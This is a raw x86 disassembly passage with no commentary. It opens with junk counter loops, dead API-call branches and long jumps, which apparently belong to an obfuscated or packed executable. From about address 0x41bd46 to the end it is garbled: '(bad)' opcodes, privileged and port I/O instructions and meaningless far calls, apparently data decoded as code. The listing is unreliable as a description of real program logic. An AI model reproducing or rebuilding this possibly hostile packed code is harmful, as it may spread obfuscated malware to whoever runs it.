  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x432ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x432ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x432ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x432000
  41bc05:	call   DWORD PTR ds:0x43fdcb
  41bc0b:	mov    esi,DWORD PTR ds:0x432ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x432ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x432373
  41bc2a:	and    DWORD PTR ds:0x432e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x432e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x432e33,edx
  41bc46:	cmp    DWORD PTR ds:0x432e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x432e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x432189
  41bc6a:	call   DWORD PTR ds:0x43fdcf
  41bc70:	cmp    DWORD PTR ds:0x432e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x432e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x432e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x432eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x432eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x432eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x432eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x43fdd3
  41bcc9:	cmp    DWORD PTR ds:0x432eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x432e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x432e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x432e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x432e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x432ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x432e47
  41bd25:	adc    esi,DWORD PTR ds:0x432eb3
  41bd2b:	mov    DWORD PTR ds:0x432e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x432e7f,0x432e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	addr16 xor al,0xa8
  41bd55:	add    DWORD PTR [edi],esp
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0xb8
  41bd5f:	scas   al,BYTE PTR es:[edi]
  41bd60:	jnp    0x41bdc4
  41bd62:	test   al,0x9a
  41bd64:	ins    BYTE PTR es:[edi],dx
  41bd65:	sub    bl,BYTE PTR [ebx+edi*4]
  41bd68:	bound  esi,QWORD PTR [esp+eax*1]
  41bd6b:	jne    0x41bd52
  41bd6d:	inc    eax
  41bd6e:	pop    ds
  41bd6f:	jae    0x41bd26
  41bd71:	inc    edi
  41bd72:	inc    esp
  41bd73:	aad    0x77
  41bd75:	mov    eax,ds:0xbecc3cad
  41bd7a:	push   esp
  41bd7b:	sbb    eax,0x245705ad
  41bd80:	cmp    al,0xa0
  41bd82:	cmp    DWORD PTR ds:0x5f1e28c2,ecx
  41bd88:	aaa    
  41bd89:	shr    edx,0x74
  41bd8c:	loopne 0x41bdac
  41bd8e:	push   cs
  41bd8f:	mov    WORD PTR [ecx+0x344c4c00],fs
  41bd95:	sbb    dl,dh
  41bd97:	mov    ds:0x6cbc1d09,al
  41bd9c:	popa   
  41bd9d:	xor    ebp,DWORD PTR [ecx+0x3b]
  41bda0:	cmp    DWORD PTR [ebp-0x23],ecx
  41bda3:	jp     0x41bdbd
  41bda5:	mov    cl,BYTE PTR [edx]
  41bda7:	sub    eax,0xb2871cb1
  41bdac:	iret   
  41bdad:	call   0x27f7:0x101b1443
  41bdb4:	in     eax,0x28
  41bdb6:	fdivr  QWORD PTR [ecx]
  41bdb8:	sub    edi,DWORD PTR [ebp-0x6eb46a2e]
  41bdbe:	outs   dx,DWORD PTR ds:[esi]
  41bdbf:	jb     0x41bdfa
  41bdc1:	or     dh,BYTE PTR [esi-0x3]
  41bdc4:	lahf   
  41bdc5:	outs   dx,DWORD PTR ds:[esi]
  41bdc6:	(bad)  
  41bdc8:	adc    al,0x47
  41bdca:	jmp    0x41bdde
  41bdcc:	hlt    
  41bdcd:	cmp    dh,al
  41bdcf:	xchg   esi,eax
  41bdd0:	fild   WORD PTR [eax+0x2a]
  41bdd3:	adc    al,0x34
  41bdd5:	dec    ecx
  41bdd6:	shl    BYTE PTR [esi],0xb6
  41bdd9:	pop    ss
  41bdda:	lahf   
  41bddb:	add    eax,0x8e05f074
  41bde0:	je     0x41be19
  41bde2:	mov    cs,esi
  41bde4:	fdiv   QWORD PTR [ebp+edi*1-0x1e]
  41bde8:	or     al,0xc2
  41bdea:	mov    DWORD PTR ds:0x33423e0f,ebx
  41bdf0:	(bad)  
  41bdf2:	dec    ebp
  41bdf3:	call   0x29659994
  41bdf8:	xor    esp,ebx
  41bdfa:	and    ebp,edi
  41bdfc:	lods   al,BYTE PTR ds:[esi]
  41bdfd:	xchg   ecx,eax
  41bdfe:	popa   
  41bdff:	loopne 0x41bded
  41be01:	add    BYTE PTR [edi],0x38
  41be04:	stos   BYTE PTR es:[edi],al
  41be05:	cmp    eax,0x447e43a9
  41be0a:	or     BYTE PTR [ecx-0x679d0f27],al
  41be10:	cmp    DWORD PTR [eax-0xe],esi
  41be13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be14:	and    eax,0xabf61826
  41be19:	jmp    0x42652ac9
  41be1e:	lock stos DWORD PTR es:[edi],eax
  41be20:	and    esp,DWORD PTR [eax+0x5e]
  41be23:	push   edi
  41be24:	(bad)  
  41be26:	jne    0x41be4c
  41be28:	dec    ebx
  41be29:	sahf   
  41be2a:	mov    edi,DWORD PTR [eax+ebp*8-0x6ac8bb96]
  41be31:	push   es
  41be32:	inc    esp
  41be33:	jmp    0x255122ae
  41be38:	pusha  
  41be39:	int3   
  41be3a:	das    
  41be3b:	pushf  
  41be3c:	test   BYTE PTR [edx-0x1fea7784],ah
  41be42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be43:	mov    esi,0xd4389665
  41be48:	pop    edx
  41be49:	mov    ebx,0xfccfb92a
  41be4e:	int    0x8e
  41be50:	cmp    al,0x91
  41be52:	lmsw   WORD PTR [ecx+0x6acb8755]
  41be59:	inc    eax
  41be5a:	mov    ebx,0xffa69f7d
  41be5f:	inc    esp
  41be60:	dec    eax
  41be61:	int    0xa9
  41be63:	push   ecx
  41be64:	push   0xc401112c
  41be69:	popf   
  41be6a:	sub    al,0x81
  41be6c:	lods   al,BYTE PTR ds:[esi]
  41be6d:	xchg   ebx,eax
  41be6e:	mov    eax,ds:0xf1e26bb4
  41be73:	in     eax,0x59
  41be75:	mov    ?,esi
  41be77:	call   0xad7:0x2ddd2831
  41be7e:	enter  0xf911,0x2e
  41be82:	and    esi,ecx
  41be84:	sbb    BYTE PTR [ebx-0x44],bl
  41be87:	iret   
  41be88:	mov    ebp,0x8e6f2e86
  41be8d:	mov    ch,0x25
  41be8f:	push   esp
  41be90:	test   BYTE PTR [esi+edx*4],dh
  41be93:	sbb    DWORD PTR [edi+ebx*2],0x26
  41be97:	sub    DWORD PTR [esi+0x59],esp
  41be9a:	shr    DWORD PTR [edi+0x688c2815],1
  41bea0:	mov    bh,BYTE PTR [ebx]
  41bea2:	mov    ah,0x5d
  41bea4:	cwde   
  41bea5:	fimul  DWORD PTR [edx+0xae97f4e]
  41beab:	loope  0x41be55
  41bead:	xchg   edx,eax
  41beae:	sub    BYTE PTR [esi-0x41],ch
  41beb1:	fwait
  41beb2:	sub    al,BYTE PTR [edi-0x152b142a]
  41beb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beb9:	fild   WORD PTR [ebp-0x60]
  41bebc:	es pop eax
  41bebe:	or     eax,DWORD PTR [edi+0x69]
  41bec1:	or     BYTE PTR ds:0xb1de4f46,bh
  41bec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bec8:	not    DWORD PTR [esi+0x2074bd1]
  41bece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41becf:	jmp    0x41be92
  41bed1:	inc    edi
  41bed2:	or     DWORD PTR [eax+edi*4],edi
  41bed5:	dec    ebp
  41bed6:	adc    esp,esp
  41bed8:	(bad)  ds:[ebx]
  41bedb:	xlat   BYTE PTR ds:[ebx]
  41bedc:	inc    ebp
  41bedd:	add    DWORD PTR ds:[ebp+0x1b],esi
  41bee1:	xor    eax,0x27e687c2
  41bee6:	sub    cl,BYTE PTR [esi]
  41bee8:	ins    DWORD PTR es:[edi],dx
  41bee9:	ret    0x16ea
  41beec:	clc    
  41beed:	lock lods al,BYTE PTR ds:[esi]
  41beef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bef0:	sub    al,0x58
  41bef2:	fistp  WORD PTR [edi-0x22]
  41bef5:	dec    esi
  41bef6:	xor    al,0xba
  41bef8:	jo     0x41bf6a
  41befa:	call   0xaa89:0xbd568df1
  41bf01:	popf   
  41bf02:	out    0x56,al
  41bf04:	mov    dh,0xde
  41bf06:	xchg   ebx,eax
  41bf07:	push   ebx
  41bf08:	mov    eax,ds:0xd3802c59
  41bf0d:	int3   
  41bf0e:	xchg   dh,al
  41bf10:	xchg   edx,eax
  41bf11:	push   0xfb506f81
  41bf16:	sub    BYTE PTR [ebx],al
  41bf18:	iret   
  41bf19:	popa   
  41bf1a:	out    0x47,al
  41bf1c:	mov    cl,0x3d
  41bf1e:	cld    
  41bf1f:	outs   dx,BYTE PTR ds:[esi]
  41bf20:	clc    
  41bf21:	pusha  
  41bf22:	push   edx
  41bf23:	aas    
  41bf24:	dec    esp
  41bf25:	push   esi
  41bf26:	out    0x8,eax
  41bf28:	sbb    ebx,ebx
  41bf2a:	dec    edi
  41bf2b:	mov    ah,0xb8
  41bf2d:	es jl  0x41bfaf
  41bf30:	ds inc edi
  41bf32:	mov    dl,0x45
  41bf34:	stos   BYTE PTR es:[edi],al
  41bf35:	retf   0xd1a7
  41bf38:	jae    0x41bfb3
  41bf3a:	enter  0x72e1,0xf1
  41bf3e:	dec    ecx
  41bf3f:	inc    edi
  41bf40:	mov    dl,0x9e
  41bf42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf43:	fldcw  WORD PTR [ecx]
  41bf45:	(bad)  
  41bf46:	int    0x34
  41bf48:	(bad)  
  41bf49:	and    eax,0x8645f918
  41bf4e:	add    BYTE PTR [esi-0x6c],bh
  41bf51:	jecxz  0x41bf00
  41bf53:	aam    0x80
  41bf55:	push   ebx
  41bf56:	inc    edx
  41bf57:	push   ds
  41bf58:	ficomp WORD PTR [ebp-0x359c7633]
  41bf5e:	pop    eax
  41bf5f:	aaa    
  41bf60:	inc    edi
  41bf61:	pop    edi
  41bf62:	jne    0x41bf3c
  41bf64:	cmp    DWORD PTR [ecx-0x5cb2887d],eax
  41bf6a:	jns    0x41bf77
  41bf6c:	(bad)  
  41bf6d:	pop    ebp
  41bf6e:	loope  0x41bf31
  41bf70:	push   edx
  41bf71:	and    BYTE PTR [edi+0x62],ah
  41bf74:	aaa    
  41bf75:	scas   al,BYTE PTR es:[edi]
  41bf76:	jp     0x41bff0
  41bf78:	add    cl,0x9f
  41bf7b:	ins    DWORD PTR es:[edi],dx
  41bf7c:	jmp    0x222f:0xdbad1785
  41bf83:	ja     0x41bf1a
  41bf85:	dec    ebx
  41bf86:	jnp    0x41bf9d
  41bf88:	es je  0x41bf5d
  41bf8b:	call   0x1604:0x8d12fed1
  41bf92:	adc    cl,dh
  41bf94:	fisubr WORD PTR [esi+0x30]
  41bf97:	es inc edi
  41bf99:	mov    dh,0x16
  41bf9b:	mov    edx,0x31decc01
  41bfa0:	loope  0x41bf3e
  41bfa2:	xor    ch,ch
  41bfa4:	push   edi
  41bfa5:	clc    
  41bfa6:	push   cs
  41bfa7:	ins    DWORD PTR es:[edi],dx
  41bfa8:	cmp    eax,0x271116e4
  41bfad:	test   DWORD PTR [edx+0x40daa89],esi
  41bfb3:	leave  
  41bfb4:	jnp    0x41bf5f
  41bfb6:	mov    DWORD PTR [ecx],ebx
  41bfb8:	mov    bh,0xea
  41bfba:	mov    al,0x6d
  41bfbc:	mov    al,ds:0xa04a9841
  41bfc1:	push   esi
  41bfc2:	shr    BYTE PTR [ecx],cl
  41bfc4:	call   0x4035:0xdf6c3507
  41bfcb:	inc    ebp
  41bfcc:	call   0x764f:0x8b7be1af
  41bfd3:	jne    0x41bfad
  41bfd5:	dec    edi
  41bfd6:	ja     0x41bfcf
  41bfd8:	shl    BYTE PTR [edx+edi*4],cl
  41bfdb:	pop    ebp
  41bfdc:	push   0x824ccaa6
  41bfe1:	sub    al,0xcb
  41bfe3:	mov    esi,0x80cac948
  41bfe8:	dec    edx
  41bfe9:	lods   eax,DWORD PTR ds:[esi]
  41bfea:	add    eax,eax
  41bfec:	std    
  41bfed:	xchg   ebp,eax
  41bfee:	jge    0x41c01b
  41bff0:	dec    ecx
  41bff1:	pop    ebp
  41bff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bff3:	jmp    FWORD PTR [edi+ecx*1]
  41bff6:	icebp  
  41bff7:	mov    ebp,DWORD PTR [ebx]
  41bff9:	fsub   DWORD PTR [ecx-0x49]
  41bffc:	inc    ebp
  41bffd:	jae    0x41c068
  41bfff:	idiv   al
  41c001:	gs (bad) 
  41c003:	int3   
  41c004:	arpl   WORD PTR [ebp+edi*1-0x4b6c6f35],di
  41c00b:	sub    DWORD PTR [ebp-0x146b11f6],0x1adf18c7
  41c015:	ds jnp 0x41c00f
  41c018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c019:	inc    eax
  41c01a:	sub    bh,BYTE PTR [edi-0x2afc5298]
  41c020:	mov    ebx,DWORD PTR [esi+edi*4]
  41c023:	repnz cmp DWORD PTR [edi+edx*4],0xffffffcc
  41c028:	lds    edi,FWORD PTR [edi+0x49]
  41c02b:	jo     0x41bfc5
  41c02d:	xchg   ebp,eax
  41c02e:	out    0x87,eax
  41c030:	repz push 0xffffffe3
  41c033:	sub    DWORD PTR [edi-0x6b7c7c61],0x56
  41c03a:	pop    ecx
  41c03b:	xor    dh,dh
  41c03d:	inc    eax
  41c03e:	mov    ebx,0x6c4dc505
  41c043:	pop    ds
  41c044:	jge    0x41c0a3
  41c046:	(bad)  
  41c047:	sub    ah,BYTE PTR [edi]
  41c049:	ins    DWORD PTR es:[edi],dx
  41c04a:	aad    0x2a
  41c04c:	xchg   ebx,eax
  41c04d:	scas   eax,DWORD PTR es:[edi]
  41c04e:	jg     0x41c031
  41c050:	ret    0xf0a9
  41c053:	xlat   BYTE PTR ds:[ebx]
  41c054:	and    DWORD PTR [edx+eiz*1+0x4b],0xd22d8ad6
  41c05c:	cld    
  41c05d:	call   0xe376f6c0
  41c062:	jecxz  0x41c030
  41c064:	fldenv [eax]
  41c066:	jg     0x41c05f
  41c068:	(bad)  
  41c069:	cmp    al,0x3c
  41c06b:	movzx  esi,BYTE PTR [ebp-0x1c349b16]
  41c072:	xor    BYTE PTR [edx],al
  41c074:	adc    eax,0x84165185
  41c079:	mov    es,WORD PTR [ebx]
  41c07b:	jecxz  0x41c045
  41c07d:	setg   BYTE PTR [ecx+0x6d]
  41c081:	push   ebx
  41c082:	and    bl,BYTE PTR fs:[ecx-0x79ac1401]
  41c089:	sar    DWORD PTR [ebp*4-0x41b73a64],cl
  41c090:	mov    ch,0xf7
  41c092:	jmp    0xe99f:0x68613fc6
  41c099:	repz mov ds:0xf27d2a61,eax
  41c09f:	inc    ebp
  41c0a0:	add    esi,esp
  41c0a2:	retf   
  41c0a3:	or     al,0xf4
  41c0a5:	in     al,0x1d
  41c0a7:	call   0x3c9baefd
  41c0ac:	cwde   
  41c0ad:	adc    eax,0x671981b4
  41c0b2:	xchg   DWORD PTR [ecx],edi
  41c0b4:	xchg   esi,eax
  41c0b5:	mov    ah,0xe5
  41c0b7:	mov    ebp,0x68b7caad
  41c0bc:	lds    ebp,FWORD PTR [esi-0x7a]
  41c0bf:	je     0x41c0a5
  41c0c1:	ss add eax,0xa6b208ed
  41c0c7:	loopne 0x41c0b7
  41c0c9:	mov    bl,0x51
  41c0cb:	pop    edi
  41c0cc:	dec    ebx
  41c0cd:	sub    BYTE PTR [ecx-0x5b930887],dl
  41c0d3:	dec    ebp
  41c0d4:	jns    0x41c0a9
  41c0d6:	xor    BYTE PTR [edx+eax*2-0x66],al
  41c0da:	loopne 0x41c078
  41c0dc:	xchg   esi,eax
  41c0dd:	and    BYTE PTR [ebx],0xfa
  41c0e0:	aaa    
  41c0e1:	and    al,0x3a
  41c0e3:	mov    ah,0xf8
  41c0e5:	outs   dx,BYTE PTR ds:[esi]
  41c0e6:	sbb    bh,0x43
  41c0e9:	xchg   ebx,ebp
  41c0eb:	jo     0x41c0e2
  41c0ed:	cld    
  41c0ee:	sub    dl,BYTE PTR [esi-0x28d47abc]
  41c0f4:	(bad)
  41c0f8:	xor    DWORD PTR [ebp+0x368be2a0],esi
  41c0fe:	hlt    
  41c0ff:	mov    al,0xa4
  41c101:	mov    bl,0x65
  41c103:	dec    edi
  41c104:	ret    
  41c105:	adc    BYTE PTR [esi-0x55],0xee
  41c109:	cli    
  41c10a:	jno    0x41c174
  41c10c:	xchg   BYTE PTR [ecx-0xd],bh
  41c10f:	jmp    0xfe70:0x34b15b8d
  41c116:	cmp    al,0x59
  41c118:	pop    esi
  41c119:	test   eax,0xe17fa6e2
  41c11e:	jl     0x41c173
  41c120:	mov    bh,0xe3
  41c122:	aad    0x6e
  41c124:	push   0x1a9cc6a6
  41c129:	ret    0xb2d3
  41c12c:	and    eax,0xa682d658
  41c131:	aad    0x3
  41c133:	sub    al,0xdf
  41c135:	cvtpi2ps xmm7,QWORD PTR [esi-0x40]
  41c139:	adc    cl,bl
  41c13b:	xchg   esi,eax
  41c13c:	mov    cl,0x7b
  41c13e:	mov    ah,BYTE PTR [edi+0x2a]
  41c141:	sub    esp,DWORD PTR [edx+ebp*4-0x37]
  41c145:	and    bl,BYTE PTR [esi+0x1b]
  41c148:	sub    edx,DWORD PTR [ebx+ebx*8-0x7c]
  41c14c:	test   DWORD PTR [ebp+eiz*2+0x65],esp
  41c150:	je     0x41c1c8
  41c152:	add    BYTE PTR [ecx],al
  41c154:	jp     0x41c108
  41c156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c157:	jmp    0x41c1cd
  41c159:	xchg   BYTE PTR [edx-0x421139b6],al
  41c15f:	add    bl,BYTE PTR [edi+0x28480d4f]
  41c165:	in     eax,dx
  41c166:	mov    esp,0xca36dea8
  41c16b:	mov    ebp,0xa7b0c6ca
  41c170:	pusha  
  41c171:	add    al,0xa4
  41c173:	test   al,0xc5
  41c175:	xor    BYTE PTR [ebx],dh
  41c177:	cmp    ah,BYTE PTR [ebx-0x29]
  41c17a:	shr    DWORD PTR [esi+0x70dce60],0xc3
  41c181:	push   0x14
  41c183:	sub    ch,BYTE PTR [eax]
  41c185:	mov    ds:0xf1319499,eax
  41c18a:	imul   ecx,DWORD PTR [esi-0x6b],0xfffffff0
  41c18e:	cmp    cl,BYTE PTR [edi+0x5c]
  41c191:	and    al,0xe1
  41c193:	int3   
  41c194:	rol    BYTE PTR [ebx],1
  41c196:	cdq    
  41c197:	sti    
  41c198:	pop    edx
  41c199:	mov    ebp,esi
  41c19b:	xchg   edx,eax
  41c19c:	add    al,0x39
  41c19e:	(bad)  
  41c19f:	or     al,0x34
  41c1a1:	mov    DWORD PTR [esi+edi*1-0xa],edi
  41c1a5:	push   0x3181a9af
  41c1aa:	call   0x6dbf720
  41c1af:	mov    dl,BYTE PTR [ebx]
  41c1b1:	ficom  WORD PTR [edi]
  41c1b3:	inc    ecx
  41c1b4:	retf   0x4282
  41c1b7:	inc    eax
  41c1b8:	and    eax,0x3cb9c07e
  41c1bd:	sbb    DWORD PTR [edx+eiz*2+0x61],esp
  41c1c1:	out    0xd9,al
  41c1c3:	lods   al,BYTE PTR ds:[esi]
  41c1c4:	je     0x41c17b
  41c1c6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c1c8:	sub    edi,DWORD PTR [ecx]
  41c1ca:	jae    0x41c1e5
  41c1cc:	add    ebx,DWORD PTR gs:[eax-0x531734f4]
  41c1d3:	(bad)  
  41c1d4:	fmul   DWORD PTR [edx+0x3a]
  41c1d7:	cwde   
  41c1d8:	mov    ds:0x58759374,al
  41c1dd:	push   esp
  41c1de:	xlat   BYTE PTR ds:[ebx]
  41c1df:	push   ebp
  41c1e0:	or     DWORD PTR [edx-0x65],ecx
  41c1e3:	mov    esi,0xee6b53c4
  41c1e8:	xlat   BYTE PTR ds:[ebx]
  41c1e9:	int    0x5c
  41c1eb:	(bad)  
  41c1ee:	jmp    0x41c1ca
  41c1f0:	mov    cs,WORD PTR [eax-0x55]
  41c1f3:	rcr    BYTE PTR [edi+ebp*1],1
  41c1f6:	cdq    
  41c1f7:	xchg   ebx,eax
  41c1f8:	lds    ebp,FWORD PTR [ebx-0x7f74984]
  41c1fe:	aas    
  41c1ff:	aas    
  41c200:	outs   dx,BYTE PTR ds:[esi]
  41c201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c202:	sahf   
  41c203:	pop    ebx
  41c204:	xchg   ecx,eax
  41c205:	xchg   ecx,eax
  41c206:	xchg   edi,eax
  41c207:	scas   eax,DWORD PTR es:[edi]
  41c208:	dec    edx
  41c209:	retf   
  41c20a:	adc    edx,esp
  41c20c:	adc    eax,DWORD PTR [ebx]
  41c20e:	scas   al,BYTE PTR es:[edi]
  41c20f:	push   ebp
  41c210:	push   edi
  41c211:	lods   eax,DWORD PTR ds:[esi]
  41c212:	cmc    
  41c213:	cmc    
  41c214:	pop    es
  41c215:	sub    bl,cl
  41c217:	adc    esi,DWORD PTR es:[ebp+eax*1-0x2]
  41c21c:	sbb    DWORD PTR [ebx-0x42354967],0x11c45763
  41c226:	adc    bl,BYTE PTR [edx]
  41c228:	sub    BYTE PTR [eax+0x7b7aded0],ah
  41c22e:	mov    bh,0xf1
  41c230:	scas   al,BYTE PTR es:[edi]
  41c231:	lea    ebx,[esi]
  41c233:	shl    BYTE PTR [edx+0x7a],1
  41c236:	cmc    
  41c237:	pop    ecx
  41c238:	dec    ecx
  41c239:	pop    esi
  41c23a:	test   eax,0xbcc62ae9
  41c23f:	or     esp,ecx
  41c241:	pop    ebx
  41c242:	ins    DWORD PTR es:[edi],dx
  41c243:	dec    edx
  41c244:	fidiv  DWORD PTR [edx+0x0]
  41c247:	mov    esi,0xcb114a94
  41c24c:	xchg   DWORD PTR [esi+0x33eb15e4],ecx
  41c252:	not    BYTE PTR [ecx-0x75]
  41c255:	jnp    0x41c1f2
  41c257:	mov    eax,0xe495844b
  41c25c:	mov    bl,0x33
  41c25e:	pop    edi
  41c25f:	add    al,0x6e
  41c261:	xor    al,0x2d
  41c263:	add    ecx,DWORD PTR [edx+0x76]
  41c266:	shl    bh,1
  41c268:	out    0x15,al
  41c26a:	outs   dx,DWORD PTR ds:[esi]
  41c26b:	push   esi
  41c26c:	push   ebx
  41c26d:	outs   dx,BYTE PTR ds:[esi]
  41c26e:	xchg   ebx,eax
  41c26f:	mov    edi,0xa1d446e4
  41c274:	mov    BYTE PTR [edx-0xf],bh
  41c277:	cwde   
  41c278:	(bad)  
  41c279:	fucomip st,st(7)
  41c27b:	fcompp 
  41c27d:	or     DWORD PTR [ecx+0x28a8ff70],eax
  41c283:	mov    ebp,0xd988b844
  41c288:	jb     0x41c2c8
  41c28a:	(bad)  
  41c28b:	out    dx,eax
  41c28c:	xchg   ebx,eax
  41c28d:	add    dl,BYTE PTR [ebp-0xe]
  41c290:	dec    esp
  41c291:	dec    ebp
  41c292:	push   edx
  41c293:	push   edx
  41c294:	and    eax,0x538046a5
  41c299:	pop    ecx
  41c29a:	das    
  41c29b:	mov    cl,0x44
  41c29d:	add    BYTE PTR ds:0x1f1e7594,0x85
  41c2a4:	outs   dx,BYTE PTR ds:[esi]
  41c2a5:	cdq    
  41c2a6:	out    dx,al
  41c2a7:	pushf  
  41c2a8:	jg     0x41c26f
  41c2aa:	sar    BYTE PTR [edi-0x3f480fb3],1
  41c2b0:	push   ebp
  41c2b1:	adc    eax,0xa468945d
  41c2b6:	enter  0x2678,0xac
  41c2ba:	mov    dh,0xae
  41c2bc:	sbb    bl,bl
  41c2be:	xchg   ebx,eax
  41c2bf:	retf   
  41c2c0:	ror    DWORD PTR [edi+0x24],1
  41c2c3:	fwait
  41c2c4:	mov    al,0xf6
  41c2c6:	lods   al,BYTE PTR ds:[esi]
  41c2c7:	or     al,0x89
  41c2c9:	xor    bh,BYTE PTR [edx]
  41c2cb:	xor    edx,DWORD PTR ds:0xef59ee56
  41c2d1:	dec    ecx
  41c2d2:	mov    DWORD PTR [ebp+0x74c31391],edi
  41c2d8:	icebp  
  41c2d9:	or     BYTE PTR [ecx],dl
  41c2db:	(bad)  
  41c2dc:	and    BYTE PTR [ebx+0x21],ch
  41c2df:	mov    dh,0xc4
  41c2e1:	sbb    BYTE PTR [edi-0x4a5261e5],0xfb
  41c2e8:	and    cl,BYTE PTR [esi-0x7138280]
  41c2ee:	and    BYTE PTR [eax],bh
  41c2f0:	jns    0x41c2ee
  41c2f2:	mov    ebp,0xa4f460f8
  41c2f7:	cs ds pop esi
  41c2fa:	shr    eax,1
  41c2fc:	daa    
  41c2fd:	mov    BYTE PTR [edx],dh
  41c2ff:	call   0x3b286840
  41c304:	sub    BYTE PTR [esp+ecx*1-0x74],ah
  41c308:	aam    0xff
  41c30a:	xchg   esp,eax
  41c30b:	mov    cl,0x85
  41c30d:	or     BYTE PTR [edx-0xf7bd3ee],0xef
  41c314:	xor    BYTE PTR [esi+ebp*4-0x18385d46],dh
  41c31b:	mov    ebx,0x47e6521f
  41c320:	mov    bl,0xfe
  41c322:	fs inc eax
  41c324:	push   eax
  41c325:	(bad)  
  41c326:	cld    
  41c327:	fidiv  WORD PTR [edi*8+0x6c38af19]
  41c32e:	xchg   ebp,eax
  41c32f:	mov    ds:0x7e805a8c,al
  41c334:	mov    eax,0x16815c7c
  41c339:	jno    0x41c2dc
  41c33b:	mov    dl,0x39
  41c33d:	sbb    BYTE PTR [ebp-0x11],al
  41c340:	push   ebx
  41c341:	test   al,0xb9
  41c343:	add    al,0xc1
  41c345:	hlt    
  41c346:	pop    ebx
  41c347:	lock xor al,0x67
  41c34a:	mov    bl,0x7b
  41c34c:	(bad)  
  41c34d:	adc    eax,0x661d1e7d
  41c352:	push   ecx
  41c353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c354:	mov    ebp,0x1a611c4f
  41c359:	lea    ebx,[esi]
  41c35b:	pop    es
  41c35c:	sbb    ecx,DWORD PTR cs:[esi-0x364e73c]
  41c363:	ret    
  41c364:	or     ebp,edi
  41c366:	xor    al,BYTE PTR [esi-0x68f24c1e]
  41c36c:	jb     0x41c311
  41c36e:	icebp  
  41c36f:	dec    edi
  41c370:	and    edi,DWORD PTR [eax]
  41c372:	push   ds
  41c373:	sti    
  41c374:	pop    ebp
  41c375:	loopne 0x41c335
  41c377:	loope  0x41c3ea
  41c379:	out    dx,al
  41c37a:	push   esi
  41c37b:	js     0x41c3e0
  41c37d:	sub    BYTE PTR [esi+0x64f50e26],ah
  41c383:	bound  ecx,QWORD PTR [eax+esi*2-0x80]
  41c387:	repz adc eax,0x4fc25e38
  41c38d:	aaa    
  41c38e:	shr    dh,cl
  41c390:	fwait
  41c391:	add    al,BYTE PTR [edi]
  41c393:	jg     0x41c36b
  41c395:	mov    edi,0x28282a48
  41c39a:	lds    eax,FWORD PTR [ecx-0x4e3cfb26]
  41c3a0:	or     esp,DWORD PTR [ecx]
  41c3a2:	push   es
  41c3a3:	xchg   ebp,eax
  41c3a4:	in     al,0x94
  41c3a6:	in     eax,dx
  41c3a7:	add    ah,BYTE PTR [edx]
  41c3a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3aa:	push   ecx
  41c3ab:	inc    ecx
  41c3ac:	dec    ecx
  41c3ad:	mov    ds:0x3cd847c2,eax
